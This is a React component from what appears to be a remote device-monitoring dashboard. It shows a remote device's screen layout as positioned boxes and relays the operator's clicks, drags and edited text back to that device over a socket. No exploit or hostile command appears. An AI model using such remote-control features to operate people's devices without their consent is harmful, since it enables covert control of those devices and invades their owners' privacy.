import React, { useEffect, useState, useRef } from "react";
import { Grid, CircularProgress, Box, Modal, TextField, Button, Typography } from "@mui/material";
import { useTranslation } from "react-i18next";
import { useDrag } from "react-use-gesture";
import { useSocket } from "../../hooks/use-socket";
import { useSocketFunctions } from "../../utils/socket";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
import MonitorViewer from "../monitorViewer";
import SendOutlinedIcon from "@mui/icons-material/SendOutlined";
import CloseOutlinedIcon from "@mui/icons-material/CloseOutlined";
import Color from "src/theme/colors";

const ScreenMonitorSkeleton = ({ monitor, device, onClose }) => {
  const { t } = useTranslation();
  const { onSocketMonitor, onScreenClickEvent, onScreenDragEvent, onSendTextEvent } =
    useSocketFunctions();
  const { socket } = useSocket();
  const screenRef = useRef(null);

  const [state, setState] = useState({
    width: 360,
    height: 720,
    x: 100,
    y: -120,
    minWidth: 180,
    minHeight: 360,
    maxWidth: 360,
    maxHeight: 720,
  });

  const [skeletonData, setSkeletionData] = useState([]);
  const [deviceWidth, setDeviceWidth] = useState("");
  const [deviceHeight, setDeviceHeight] = useState("");
  const [changeLoading, setChangeLoading] = useState(false);
  const [positions, setPositions] = useState([]);
  const [mouseDown, setMouseDown] = useState(false);
  const [modalOpen, setModalOpen] = useState(false);
  const [modalData, setModalData] = useState(null);

  useEffect(() => {
    const deviceId = device?.deviceId;
    let isMounted = true;

    const monitorDevice = async () => {
      try {
        if (deviceId) {
          setChangeLoading(true);
          await onSocketMonitor(monitor, { deviceId });

          const handleMonitorResponse = (data) => {
            if (isMounted && monitor === data.type) {
              const deviceW = data.response?.deviceWidth;
              const deviceH = data.response?.deviceHeight;
              const skeletonRes = data.response?.skeletonData;

              setDeviceWidth(deviceW);
              setDeviceHeight(deviceH);
              setSkeletionData(skeletonRes);
              setChangeLoading(false);
            }
          };

          socket.on(`screen-skeleton-shared-${deviceId}`, handleMonitorResponse);

          return () => {
            socket.off(`screen-skeleton-shared-${deviceId}`, handleMonitorResponse);
            isMounted = false;
          };
        }
      } catch (error) {
        console.error("Error monitoring device:", error);
      }
    };

    monitorDevice();
  }, [monitor]);

  // Close
  const onCloseModal = async () => {
    try {
      onClose(false);
    } catch (error) {
      console.log("close monitor modal error", error);
    }
  };

  // Prevent drag on image
  const preventDrag = (e) => {
    e.stopPropagation();
  };

  const handleSkeletonClick = (data) => {
    if (data.type === "edit") {
      setModalData(data);
      setModalOpen(true);
    }
  };

  // send screen text
  const onSendInputText = async () => {
    setModalOpen(false);
    try {
      const deviceId = device?.deviceId;

      await onSendTextEvent(SocketIOPublicEvents.screen_send_text_event, {
        deviceId,
        modalData,
      });
    } catch (error) {
      console.log("send text error", error);
    }
  };

  // X, Y calculation
  const calculatePosition = (clientX, clientY) => {
    const screenElement = screenRef.current;
    if (!screenElement || !screenElement.offsetWidth || !screenElement.offsetHeight) {
      return { xPosition: 0, yPosition: 0 };
    }

    const rect = screenElement.getBoundingClientRect();

    const x = clientX - rect.left;
    const y = clientY - rect.top;
    const renderedWidth = rect.width;
    const renderedHeight = rect.height;

    const xRate = deviceWidth / renderedWidth;
    const yRate = deviceHeight / renderedHeight;

    let xPosition = x * xRate;
    let yPosition = y * yRate;

    xPosition = parseFloat(xPosition.toFixed(6));
    yPosition = parseFloat(yPosition.toFixed(6));

    return { xPosition, yPosition };
  };

  // Handle drag
  const bind = useDrag(async ({ event, memo = { startX: 0, startY: 0 } }) => {
    const deviceId = device?.deviceId;

    if (event.type === "pointerdown") {
      setPositions([]);
      setMouseDown(true);
      memo.startX = event.clientX;
      memo.startY = event.clientY;
    } else if (event.type === "pointermove") {
      if (mouseDown) {
        const { xPosition, yPosition } = calculatePosition(event.clientX, event.clientY);
        if (xPosition >= 0 && yPosition >= 0) {
          setPositions((prevPositions) => [...prevPositions, { x: xPosition, y: yPosition }]);
        }
      }
    } else if (event.type === "pointerup") {
      setMouseDown(false);
      if (positions.length === 0) {
        const { xPosition, yPosition } = calculatePosition(event.clientX, event.clientY);

        if (xPosition >= 0 && yPosition >= 0) {
          await onScreenClickEvent(SocketIOPublicEvents.screen_click_event, {
            deviceId,
            xPosition,
            yPosition,
          });
        }
      } else {
        console.log("Drag Positions:", positions);
        await onScreenDragEvent(SocketIOPublicEvents.screen_drag_event, {
          deviceId,
          positions,
        });
      }
      setPositions([]);
    }
    return memo;
  });

  return (
    <MonitorViewer
      initialState={{
        width: 360,
        height: 720,
        x: 100,
        y: -120,
        minWidth: 180,
        minHeight: 360,
        maxWidth: 360,
        maxHeight: 720,
      }}
      onClose={onCloseModal}
    >
      <div style={{ position: "relative", width: "100%", height: "100%" }} ref={screenRef}>
        <Grid
          sx={{
            display: "flex",
            flexDirection: "column",
            position: "relative",
            width: "100%",
            height: "100%",
          }}
        >
          <Grid
            sx={{
              cursor: "default",
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
              width: "100%",
              height: "100%",
              pb: 1,
              position: "relative",
              backgroundColor: "black",
              border: `1px solid ${Color.background.border}`,
            }}
          >
            <Grid
              onMouseDown={preventDrag}
              onTouchStart={preventDrag}
              sx={{
                height: "100%",
                width: "100%",
              }}
              {...bind()}
            >
              {skeletonData.map((data, index) => (
                <Box
                  key={index}
                  className="screen-body"
                  sx={{
                    cursor: data.type === "edit" ? "pointer" : "default",
                    position: "absolute",
                    width: `${data.width * (320 / deviceWidth)}px`,
                    height: `${data.height * (660 / deviceHeight)}px`,
                    left: `${data.xposition * (320 / deviceWidth)}px`,
                    top: `${data.yposition * (660 / deviceHeight)}px`,
                    backgroundColor: "black",
                    border: `1px solid ${Color.background.border}`,
                    color: Color.text.primary,
                    fontSize: "12px",
                  }}
                  onClick={() => handleSkeletonClick(data)}
                >
                  {data.text}
                </Box>
              ))}
            </Grid>
          </Grid>
        </Grid>

        {/* Modal for editing */}
        <Modal open={modalOpen} onClose={() => setModalOpen(false)}>
          <Box
            sx={{
              position: "absolute",
              top: "50%",
              left: "50%",
              transform: "translate(-50%, -50%)",
              width: 400,
              border: `solid 1px ${Color.background.border}`,
              backgroundColor: Color.background.main,
              borderRadius: "5px",
              p: 2,
              zIndex: 99999,
            }}
          >
            <Box
              sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}
            >
              <Typography component="h2" sx={{ color: Color.text.primary }}>
                {t("devicesPage.monitors.screen-skeleton")}
              </Typography>
              <CloseOutlinedIcon
                onClick={() => setModalOpen(false)}
                sx={{
                  color: Color.text.primary,
                  cursor: "pointer",
                  fontSize: "20px",
                }}
              />
            </Box>
            <Box sx={{ display: "flex", alignItems: "center", gap: "10px" }}>
              <TextField
                fullWidth
                label={t("devicesPage.monitors.skeleton-input")}
                value={modalData?.text || ""}
                onChange={(e) => setModalData({ ...modalData, text: e.target.value })}
              />
              <SendOutlinedIcon
                onClick={() => onSendInputText()}
                sx={{
                  color: Color.text.primary,
                  cursor: "pointer",
                  fontSize: "30px",
                }}
              />
            </Box>
          </Box>
        </Modal>
      </div>
    </MonitorViewer>
  );
};

export default ScreenMonitorSkeleton;
